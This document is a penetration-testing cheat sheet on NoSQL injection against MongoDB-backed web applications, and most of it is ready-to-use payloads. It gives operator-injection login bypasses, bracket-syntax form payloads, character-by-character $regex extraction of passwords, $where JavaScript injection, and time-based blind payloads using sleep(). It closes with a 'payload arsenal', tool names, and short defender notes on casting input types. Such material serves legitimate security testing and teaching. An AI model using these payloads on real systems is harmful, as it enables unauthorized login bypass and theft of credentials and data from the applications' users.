# NoSQL Injection

Inject into a NoSQL query (usually **MongoDB**) so you change its logic — bypass login, dump
data, or run server-side JS. Instead of breaking out of a string with a quote (SQLi), you often
inject **query operators** (`$ne`, `$gt`, `$regex`) because the app passes user input straight
into the query object.

Replace placeholders (`<...>`) with your own values.

---
---

# PART 1 — OVERVIEW (at a glance)

## Two flavours

| Type | Where | Example |
|------|-------|---------|
| **Operator injection** | JSON body / params turned into query objects | `{"user":"admin","pass":{"$ne":null}}` |
| **Syntax injection** | input concatenated into a string / `$where` JS | `admin' || '1'=='1` · `';return true;//` |

## The workflow

1. **Detect** — inject `'` `"` `\` `{` `;` and operators; watch for errors or behaviour change.
2. **Auth bypass** — replace a value with an always-true operator (`$ne`, `$gt`, `$regex`).
3. **Extract** — pull data with `$regex` char-by-char, or `$where` JS.
4. **Blind** — infer via boolean (`$regex` match/no-match) or time (`sleep()` in `$where`).

## Go-to payloads

```
# JSON login body — operator injection:
{"username":"admin","password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}

# form / URL params — same thing, bracket syntax:
username=admin&password[$ne]=x

# string context ($where / concatenated):
admin' || '1'=='1
```

## Defender notes (for the report)

- **Cast input to the expected type** (string) before it hits the query; reject objects where a
  scalar is expected.
- Never build queries by merging the raw request body; disable server-side `$where` / JS.
- Use schema validation (e.g. Mongoose) and parameterised query builders.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Detect

Send characters that are special to Mongo/JS and watch for a 500, a stack trace, or a changed
response:

```
'   "   \   {   }   ;   $   `
username[$ne]=1          # if the param name accepts operators → operator injection likely
```

## Step 2 — Auth bypass

**JSON body** (API login) — swap the password check for an always-true operator:

```json
{"username":"admin","password":{"$ne":null}}
{"username":{"$in":["admin"]},"password":{"$ne":"x"}}
{"username":{"$gt":""},"password":{"$gt":""}}      // logs in as the first user
```

**Form / URL** — same operators via PHP/Express bracket syntax:

```
username=admin&password[$ne]=x
username[$ne]=x&password[$ne]=x
```

```
what happens: the password comparison becomes "not equal to null" = always true → logged in
```

## Step 3 — Extract data with $regex

Confirm a value char-by-char (works even when only login success/failure shows):

```json
{"username":"admin","password":{"$regex":"^a"}}     // true if password starts with 'a'
{"username":{"$regex":"^adm"}}                        // enumerate usernames by prefix
```

Walk the charset (`^a`, `^b`, …, `^aa`, …) — a "login success" confirms each next character.

## Step 4 — $where / JS injection (if enabled)

If the app uses `$where` or `mapReduce`, you can run JavaScript in the query:

```
'; return true; var x='          // always-true (auth bypass)
' || this.password.match(/^a/) || '   // boolean extraction
```

## Step 5 — Blind (boolean & time)

```
# boolean — $regex above IS the boolean channel (match vs no-match)
# time — sleep in $where when a condition holds:
{"$where":"if(this.username=='admin'){sleep(5000)};return true"}
';if(this.password[0]=='a'){sleep(5000)};'
```

---
---

# PART 3 — PAYLOAD ARSENAL

## Operator reference (MongoDB)

| Operator | Meaning | Use |
|----------|---------|-----|
| `$ne` | not equal | `{"$ne":null}` → always true |
| `$gt` / `$gte` | greater than | `{"$gt":""}` → matches first record |
| `$in` / `$nin` | in / not in list | `{"$in":["admin"]}` |
| `$regex` | pattern match | `{"$regex":"^a"}` → char-by-char extraction |
| `$where` | server-side JS | `"sleep(5000)"` · `"return true"` |
| `$exists` | field present | `{"$exists":true}` |

## Auth-bypass payloads

```json
// JSON body
{"username":"admin","password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```

```
# form / query params
username=admin&password[$ne]=x
user[$gt]=&pass[$gt]=
# string context
admin' || '1'=='1     admin'||'1'=='1'//     ' || true || '
```

## $where JS payloads

```
'; return true; //
' || this.password.match(/^a/) || '
{"$where":"sleep(5000)||true"}
```

## Tools

```bash
nosqlmap                      # automated NoSQLi (auth bypass, extraction)
# or Burp Repeater: change Content-Type to application/json and inject operators by hand
```

---

**Key idea:** NoSQL injection usually isn't about quotes — it's about **type confusion**. The app
expects a string but hands the database the JSON object you sent, so you slip in query **operators**
(`$ne`, `$gt`, `$regex`) that rewrite the query's logic: turn a password check into "not null",
enumerate values with `$regex`, or run JS via `$where`. Fix: force inputs to the expected scalar
type and never merge the raw request body into a query.
